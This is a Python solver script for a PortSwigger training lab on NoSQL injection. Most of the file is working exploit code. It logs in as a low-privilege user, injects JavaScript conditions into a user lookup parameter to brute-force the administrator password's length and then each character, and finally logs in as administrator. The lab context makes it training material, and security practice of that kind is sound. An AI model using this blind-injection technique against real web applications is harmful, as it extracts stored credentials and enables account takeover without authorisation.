# Exploiting NoSQL injection to extract data

# https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import string
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def connect_as_wiener(s, url):
	print('\n[+] Trying to log in as Wiener...')
	account_path = url + '/my-account'
	login_path = url + '/login'
	r = s.get(account_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	login_data = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
	r = s.post(login_path, data=login_data)
	time.sleep(1)
	return r

def get_password_length(s, url):
	print('\n[+] Trying to define the length of the password...')
	lookup_path = url + '/user/lookup?user='
	for i in range(16):
		payload = f"administrator' && this.password.length == {str(i)} || 'a'=='b"
		fuzz_len_path = lookup_path + urllib.request.quote(payload)
		sys.stdout.write(f'\r{payload}')
		r = s.get(fuzz_len_path)
		time.sleep(.3)
		if r.status_code == 200 and not 'Could not find user' in r.text:
			print(f"\n[+] The password is {str(i)} characters long.")
			return i
		else:
			sys.stdout.flush()

def get_password(s, url, password_length):
	print('\n[+] Trying to retrieve the password...')
	lookup_path = url + '/user/lookup?user='
	chars = string.ascii_lowercase
	password = ''
	for i in range(password_length):
		for char in chars:
			payload = f"administrator' && this.password[{str(i)}]=='{char}"
			fuzz_passwd_path = lookup_path + urllib.request.quote(payload)
			sys.stdout.write(f'\r{payload}')
			r = s.get(fuzz_passwd_path)
			time.sleep(.3)
			if r.status_code == 200 and not 'Could not find user' in r.text:
				print('\r')
				password += char
				break
			else:
				sys.stdout.flush()
	print(f"\n[+] The password is:\t{password}")
	return password

def admin_login(s, url, password):
	print('\n[+] Trying to login as Administrator with found credentials...\n')
	login_path = url + '/login'
	r = s.get(login_path)
	csrf_token = get_csrf_token(r)
	username = "administrator"
	login_data = {"username": username, "password": password, "csrf": csrf_token}
	r = s.post(login_path, data=login_data)
	time.sleep(1)
	res = r.text
	if 'Your username is: administrator' in res:
		print("[+] Successfully logged in as Administrator !")
		return r.text
	else:
		return False


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Exploiting NoSQL injection to extract data')
	parser = argparse.ArgumentParser(description="[+] Lab: Exploiting NoSQL injection to extract data")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print("[+] Trying to retrieve administrator's password...\n")
			time.sleep(2)
			
			r = connect_as_wiener(s, url)
			if r.status_code == 200:
				print("[+] Successfully logged in as Wiener !")
				password_length = get_password_length(s, url)
				password = get_password(s, url, password_length)
				admin_login(s, url, password)
			s.cookies.clear()
			s.headers.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
